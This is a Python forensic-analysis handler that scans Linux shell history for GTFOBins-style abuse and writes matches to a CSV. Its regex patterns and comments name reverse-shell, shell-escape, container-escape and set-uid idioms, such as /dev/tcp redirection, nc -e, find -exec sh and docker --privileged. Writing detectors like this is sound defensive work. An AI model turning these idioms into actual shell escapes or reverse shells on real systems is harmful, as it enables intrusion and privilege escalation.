"""Handler: GTFOBins exploitation in shell history (Linux). Output: gtfobins.csv

Scans each user's shell history (the same source the `bash` parser reads) for
GTFOBins-style abuse of legitimate binaries: the exact invocation fragment that
turns find/awk/vim/tar/python/... into a shell escape, a reverse shell, or a
privilege escalation. Only the exploitation fragment matches -- a plain
`find /var -name x` or `sudo vim /etc/hosts` does not -- so the table is
evidence of a technique actually run, not a list of installed tools.

Complements two existing signals: `suid` flags a GTFOBins binary that carries
the set-uid bit (a standing privesc vector), while this flags the command that
was typed. The `sudo` column marks a match launched via sudo/doas (root privesc
rather than a lateral shell escape). Binaries and idioms are curated from
GTFOBins (gtfobins.github.io); patterns favour precision over recall so benign
admin history stays quiet. category: detections.
"""

from __future__ import annotations

import re

from artifact_engine.handlers._lincommon import root, write_csv
from artifact_engine.handlers.lin_bash import iter_history

# A leading sudo/doas turns any of the shell escapes below into root privesc.
_SUDO = re.compile(r"^\s*(sudo|doas)\b", re.IGNORECASE)

# Shell-name alternation reused below: sh|bash|zsh|ksh|ash|dash (optional path).
_SH = r"(?:/(?:usr/)?bin/)?(?:ba|z|k|a|da)?sh"

# (binary, function, regex) ordered by severity -- the first match wins per
# command, so reverse shells and shell escapes rank above the softer signals.
# Every pattern keys on the *exploitation fragment*, never just the binary name.
_TECHNIQUES = [
    # ---- reverse / bind shells -------------------------------------------
    ("bash",   "reverse-shell", r"/dev/(?:tcp|udp)/"),                         # bash -i >& /dev/tcp/h/p
    ("nc",     "reverse-shell", r"\b(?:nc|ncat|netcat)\b.*(?:\s-(?:e|c)\s|--exec\b|--sh-exec\b)"),
    ("socat",  "reverse-shell", r"\bsocat\b.*\b(?:exec|system)\s*:"),          # socat ... exec:'sh'
    ("mkfifo", "reverse-shell", r"\bmkfifo\b.*\b(?:nc|ncat|" + _SH + r"\s+-i)\b"),
    # ---- shell escape from a legitimate binary ---------------------------
    ("find",   "shell",   r"\bfind\b.*\s-exec(?:dir)?\s+" + _SH + r"\b"),      # find ... -exec sh ;
    ("vim",    "shell",   r"\b(?:r?vim|vi|view|nvim|vimdiff)\b.*\s(?:-c|--cmd)\s+['\"]?:?"
                          r"(?:!|py\b|python|lua\b|luado|shell\b|call\s+system|perl\b|rubydo)"),
    ("awk",    "shell",   r"\b[gmn]?awk\b.*BEGIN\s*\{\s*system\s*\("),         # awk 'BEGIN{system("sh")}'
    ("python", "shell",   r"\bpython[0-9.]*\b.*\bpty\.spawn\s*\("),            # pty shell upgrade
    ("python", "shell",   r"\bpython[0-9.]*\b\s+-c\b.*(?:os\.system|subprocess\.\w+)\s*\(.*(?:" + _SH + r")\b"),
    ("perl",   "shell",   r"\bperl[0-9.]*\b.*-e\b.*\b(?:exec|system)\b.*['\"][^'\"]*" + _SH + r"\b"),
    ("ruby",   "shell",   r"\bruby\b.*-e\b.*\b(?:exec|system|spawn)\b.*['\"][^'\"]*" + _SH + r"\b"),
    ("php",    "shell",   r"\bphp\b.*-r\b.*\b(?:system|exec|passthru|shell_exec|popen|proc_open)\s*\(.*" + _SH + r"\b"),
    ("lua",    "shell",   r"\blua[0-9.]*\b.*-e\b.*os\.execute\s*\("),
    ("node",   "shell",   r"\bnode\b.*-e\b.*child_process.*\b(?:exec|spawn)\b"),
    ("env",    "shell",   r"\benv\b(?:\s+-\S+)*\s+" + _SH + r"\b(?:\s|$)"),    # env /bin/sh
    ("nmap",   "shell",   r"\bnmap\b.*--interactive\b"),
    ("tar",    "shell",   r"\btar\b.*(?:--checkpoint-action\s*=?\s*exec|--to-command)"),
    ("zip",    "shell",   r"\bzip\b.*(?:--(?:unzip|test)-command|\s-TT\b)"),
    ("gdb",    "shell",   r"\bgdb\b.*-ex\b.*\b(?:call\s+.*system|python|shell)\b"),
    ("expect", "shell",   r"\bexpect\b.*-c\b.*spawn\s+.*" + _SH + r"\b"),
    # ---- privilege escalation / container escape -------------------------
    ("docker", "privesc", r"\bdocker\b\s+run\b.*(?:--privileged\b|-v\s*/:(?:/|\s))"),
    ("pkexec", "privesc", r"\bpkexec\b\s+" + _SH + r"\b"),                     # pkexec /bin/sh
    ("chmod",  "suid",    r"\bchmod\b\s+(?:u?\+s\b|[0-7]*[46][0-7]{3}\b).*"
                          r"(?:/bin/|/usr/bin/|/tmp/|/dev/shm/|/var/tmp/|\bbash\b|\bsh\b|\bdash\b|\bpython|\bperl\b|\bfind\b)"),
]
_TECHNIQUES = [(b, f, re.compile(p, re.IGNORECASE)) for b, f, p in _TECHNIQUES]

# Severity order for sorting the output (reverse shells first).
_RANK = {"reverse-shell": 0, "shell": 1, "privesc": 2, "suid": 3}


def run(ctx) -> None:
    rows: list[list] = []
    for user, shell, seq, cmd in iter_history(root(ctx.evidence)):
        for binary, function, rx in _TECHNIQUES:
            if rx.search(cmd):
                sudo = "yes" if _SUDO.match(cmd) else ""
                rows.append([user, shell, seq, binary, function, sudo, cmd])
                break  # one row per command: the highest-severity technique wins
    # Most dangerous first (reverse shell, then shell escape, ...), sudo ahead of
    # plain within each tier, then stable by user + on-disk order.
    rows.sort(key=lambda r: (_RANK.get(r[4], 9), r[5] != "yes", r[0], r[2]))
    write_csv(ctx.out, "gtfobins.csv",
              ["user", "shell", "id", "binary", "function", "sudo", "command"], rows)
